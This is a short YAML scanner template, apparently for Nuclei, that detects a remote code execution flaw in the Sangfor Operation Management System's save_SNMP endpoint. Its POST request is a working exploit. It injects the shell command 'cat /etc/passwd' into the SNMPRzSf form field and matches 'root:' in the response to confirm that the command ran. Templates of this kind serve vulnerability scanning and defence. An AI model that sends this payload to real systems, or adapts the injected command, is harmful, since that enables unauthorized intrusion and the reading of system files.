id: poc-yaml-sangfor-omsms-save-snmp-rce
info:
  name: Sangfor OM SMS save_SNMP Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    Sangfor Operation Management System save_SNMP endpoint is vulnerable to remote code execution.
http:
  - method: POST
    path:
      - "{{BaseURL}}/fort/system;help/SNMP/save_SNMP"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      SNMPedition=v3&SNMPsecurityLevel=authPriv&SNMPYhName=testuser&SNMPRzPw=test&SNMPJmPw=test&SNMPJmSf=AES&SNMPRzSf=MD5;cat+/etc/passwd;&SNMPAddress=127.0.0.1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
          - "\"success\":\"success\""
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "<"
        negative: true
